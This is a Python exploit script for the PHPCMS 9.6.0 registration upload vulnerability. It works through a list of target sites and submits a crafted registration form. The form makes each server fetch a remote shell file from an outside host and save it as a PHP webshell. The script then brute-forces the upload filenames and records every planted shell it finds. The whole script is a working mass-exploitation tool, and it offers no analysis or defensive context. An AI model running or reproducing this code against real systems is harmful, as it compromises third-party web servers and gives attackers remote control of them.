#!/usr/bin/env python
# coding: utf-8
#Authon:phyb0x
#phpcms9.6.0 upload

import requests
import time 
import re

result = []
def savewebshell(file,list):
	s = '\n'.join(list)
	with open(file,'a') as output:
		output.write(s)

def poc():
	fp = open("url.txt","r")
	alllines = fp.readlines()
	fp.close()
	for eachline in alllines:
		eachline = eachline.strip()
		host = eachline
		try:
			url ="{}index.php?m=member&c=index&a=register&siteid=1".format(host)
			shell = ''
			data = {
				'siteid':'1',
				'modelid':'11',
				'username':'t3esht123',
				'password':'t3esht123',
				'email':'tdehst@qq.com',
				'info[content]':'<img src=http://www.blogsir.com.cn/lj_ctf/shell.txt?.php#.jpg>',
				'dosubmit':'1'}
	
			nowtime = time.strftime('%Y%m%d%I%M%S')
			nowtime = nowtime[:13]
			req = requests.post(url=url,data=data)
			path = 'uploadfile/' + time.strftime("%Y") +'/'+ time.strftime("%m%d") + '/'
			for i in range(0000,9999):
				filename = nowtime + str(i) +'.php'
				shell = host + path + filename
				req = requests.get(url=shell)
				if req.status_code == 200:
					global result
					result.append(shell)
					print('shell:',shell)
					break
		except Exception as a:
			print('Request Bad')	
			
if __name__ == '__main__':
	poc()
	savewebshell('webshell.txt',result)